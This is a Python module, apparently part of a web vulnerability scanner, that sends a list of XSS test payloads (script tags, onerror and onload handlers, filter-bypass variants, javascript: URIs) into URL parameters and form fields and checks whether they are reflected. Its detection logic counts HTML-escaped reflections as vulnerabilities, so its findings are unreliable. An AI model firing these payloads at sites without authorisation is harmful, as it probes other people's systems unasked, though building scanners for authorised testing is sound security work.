import logging
from typing import List, Dict, Optional
import re
from urllib.parse import urlparse, parse_qs, urlencode

logger = logging.getLogger(__name__)

class XSSScanner:
    def __init__(self, client=None):
        # Инициализация HTTP клиента
        self.client = client
        
        # Список полезных нагрузок для тестирования XSS уязвимостей
        self.payloads = [
            # Базовые полезные нагрузки
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '<body onload=alert(1)>',
            '<input autofocus onfocus=alert(1)>',
            
            # Полезные нагрузки с кодировкой
            '<script>alert(1)</script>'.encode('utf-8').hex(),
            '<img src=x onerror=alert(1)>'.encode('utf-8').hex(),
            
            # Полезные нагрузки с обходом фильтров
            '<scr<script>ipt>alert(1)</scr</script>ipt>',
            '<img src=x onerror=alert(1)//',
            '<svg><script>alert(1)</script></svg>',
            
            # Полезные нагрузки с событиями
            '<img src=x onmouseover=alert(1)>',
            '<div onmouseover=alert(1)>XSS</div>',
            '<a onmouseover=alert(1)>XSS</a>',
            
            # Полезные нагрузки с атрибутами
            '<img src=x onerror=alert(1) x=>',
            '<img src=x onerror=alert(1) x=',
            '<img src=x onerror=alert(1) x',
            
            # Полезные нагрузки с JavaScript
            'javascript:alert(1)',
            'data:text/html,<script>alert(1)</script>',
            'vbscript:msgbox(1)'
        ]
        
        # Паттерны для поиска отраженных полезных нагрузок
        self.reflection_patterns = [
            r'<script[^>]*>.*?</script>',
            r'<img[^>]*>',
            r'<svg[^>]*>',
            r'<body[^>]*>',
            r'<input[^>]*>',
            r'<div[^>]*>',
            r'<a[^>]*>'
        ]

    async def scan(self, url: str, forms: Optional[List[Dict]] = None) -> List[Dict]:
        """Основной метод сканирования, который проверяет XSS уязвимости"""
        vulnerabilities = []
        
        try:
            # Проверка параметров URL
            url_vulns = await self._check_url_params(url)
            vulnerabilities.extend(url_vulns)
            
            # Проверка форм
            if forms:
                form_vulns = await self._check_forms(url, forms)
                vulnerabilities.extend(form_vulns)
                
        except Exception as e:
            logger.error(f"XSS scan error: {str(e)}")
        
        return vulnerabilities

    async def _check_url_params(self, url: str) -> List[Dict]:
        """Проверка параметров URL на XSS уязвимости"""
        vulnerabilities = []
        try:
            parsed_url = urlparse(url)
            params = parse_qs(parsed_url.query)
            
            for param, values in params.items():
                for payload in self.payloads:
                    # Создаем новый URL с полезной нагрузкой
                    test_params = params.copy()
                    test_params[param] = [payload]
                    test_url = parsed_url._replace(query=urlencode(test_params, doseq=True)).geturl()
                    
                    # Отправляем запрос
                    response = await self.client.get(test_url)
                    
                    if response['status_code'] == 200:
                        if self._is_vulnerable(response['text'], payload):
                            vulnerabilities.append({
                                'type': 'XSS',
                                'url': test_url,
                                'parameter': param,
                                'payload': payload,
                                'evidence': self._get_evidence(response['text'], payload)
                            })
                            
        except Exception as e:
            logger.error(f"URL params check error: {str(e)}")
            
        return vulnerabilities

    async def _check_forms(self, url: str, forms: List[Dict]) -> List[Dict]:
        """Проверка форм на XSS уязвимости"""
        vulnerabilities = []
        try:
            for form in forms:
                method = form.get('method', 'GET').upper()
                action = form.get('action', url)
                
                for field in form.get('fields', []):
                    field_name = field.get('name')
                    field_type = field.get('type', 'text')
                    
                    # Пропуск полей, не подходящих для XSS
                    if field_type not in ['text', 'textarea', 'hidden']:
                        continue
                    
                    for payload in self.payloads:
                        try:
                            # Подготовка данных формы
                            form_data = {}
                            for f in form.get('fields', []):
                                if f.get('name') == field_name:
                                    form_data[f.get('name')] = payload
                                else:
                                    form_data[f.get('name')] = f.get('value', '')
                            
                            # Отправка запроса
                            if method == 'GET':
                                response = await self.client.get(action, params=form_data)
                            else:
                                response = await self.client.post(action, data=form_data)
                            
                            if response['status_code'] == 200:
                                if self._is_vulnerable(response['text'], payload):
                                    vulnerabilities.append({
                                        'type': 'XSS',
                                        'url': action,
                                        'parameter': field_name,
                                        'payload': payload,
                                        'evidence': self._get_evidence(response['text'], payload),
                                        'form_method': method
                                    })
                                    
                        except Exception as e:
                            logger.error(f"Form check error for {field_name}: {str(e)}")
                            
        except Exception as e:
            logger.error(f"Forms check error: {str(e)}")
            
        return vulnerabilities

    def _is_vulnerable(self, response_text: str, payload: str) -> bool:
        """Проверка, является ли ответ уязвимым к XSS"""
        try:
            # Проверка на отражение полезной нагрузки
            if payload in response_text:
                return True
                
            # Проверка на отражение с кодировкой
            encoded_payload = payload.encode('utf-8').hex()
            if encoded_payload in response_text:
                return True
                
            # Проверка на отражение с HTML-кодировкой
            html_encoded = payload.replace('<', '&lt;').replace('>', '&gt;')
            if html_encoded in response_text:
                return True
                
            # Проверка на отражение с URL-кодировкой
            url_encoded = payload.replace(' ', '%20').replace('<', '%3C').replace('>', '%3E')
            if url_encoded in response_text:
                return True
                
        except Exception as e:
            logger.error(f"Vulnerability check error: {str(e)}")
            
        return False

    def _get_evidence(self, response_text: str, payload: str) -> str:
        """Получение доказательства уязвимости"""
        try:
            # Поиск отражения полезной нагрузки
            if payload in response_text:
                return f"Payload '{payload}' was reflected in the response"
                
            # Поиск отражения с кодировкой
            encoded_payload = payload.encode('utf-8').hex()
            if encoded_payload in response_text:
                return f"Encoded payload '{encoded_payload}' was reflected in the response"
                
            # Поиск отражения с HTML-кодировкой
            html_encoded = payload.replace('<', '&lt;').replace('>', '&gt;')
            if html_encoded in response_text:
                return f"HTML-encoded payload '{html_encoded}' was reflected in the response"
                
            # Поиск отражения с URL-кодировкой
            url_encoded = payload.replace(' ', '%20').replace('<', '%3C').replace('>', '%3E')
            if url_encoded in response_text:
                return f"URL-encoded payload '{url_encoded}' was reflected in the response"
                
        except Exception as e:
            logger.error(f"Evidence collection error: {str(e)}")
            
        return "No direct evidence found"